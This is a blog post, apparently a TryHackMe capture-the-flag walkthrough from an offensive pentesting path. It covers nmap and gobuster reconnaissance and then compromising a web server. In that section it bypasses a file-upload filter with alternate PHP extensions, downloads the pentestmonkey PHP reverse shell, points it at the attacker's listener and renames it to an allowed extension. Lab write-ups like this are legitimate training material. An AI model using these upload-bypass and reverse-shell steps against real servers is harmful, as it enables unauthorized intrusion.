---
layout: post
title:  "TryHackMe Offensive Pentesting Path"
date:   2022-08-16
categories: 
---

{% capture details %}
* **Scan Target:** 
	* <code class="custom">
$ nmap -sV 0.0.0.0 <br>
-sV: Probe open ports to determine service/version info <br>
-0.0.0.0: IP address of target
</code>

	* | PORT | STATE | SERVICE | VERSION |
|:-----|:------|:--------|:--------|
| 3333/tcp | open | http | Apache httpd 2.4.18 ((ubuntu)) |
{: .customTable}

* **Discover Directories**
	* <code class="custom">
$ gobuster dir -u http://0.0.0.0:3333 -w /usr/share/wordlists/dirb/common.txt <br>
-u: Target URL <br>
-w: Wordlist
</code>

	* | DIRECTORY | STATUS |
|:----------|:-------|
|/internal  | 301    |
{: .customTable}

* **Visit URL**
	* ![Target URL Port 3333](/assets/targetPort3333.png){: .customImage}
{% endcapture %}
{: .section}
{% capture summary %} 
Reconnaissance :artificial_satellite:
{% endcapture %}{% include details.html %}

{% capture details %}
* Create and attempt to upload file with *.php* extension
	* ![Upload shell.php](/assets/uploadShellphp.png)

* Create custom extension-list to test what file extensions can be uploaded
	*  <code class="custom">
$ cat phpext.txt <br>
.php <br>
.php3 <br>
.php4 <br>
.php5 <br>
.phtml 
</code>

* Use Burp Suite to enumerate through extensions and find out which ones are allowed

* Get PHP Reverse Shell from *pentestmonkey*
	* <code class="custom">
$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php <br><br>
Modify 'ip' and 'port' variables to your host machine's IP and netcat port you will use, respectively <br>
$ip = '127.0.0.1';  // CHANGE THIS <br>
$port = 1234;       // CHANGE THIS <br>
</code>

* Rename reverse shell file extension to allowed extension
	* <code class="custom">
$ mv php-reverse-shell.php php-reverse-shell.phtml
</code>

{% endcapture %}
{: .section}
{% capture summary %} 
Compromise Webserver
{% endcapture %}{% include details.html %}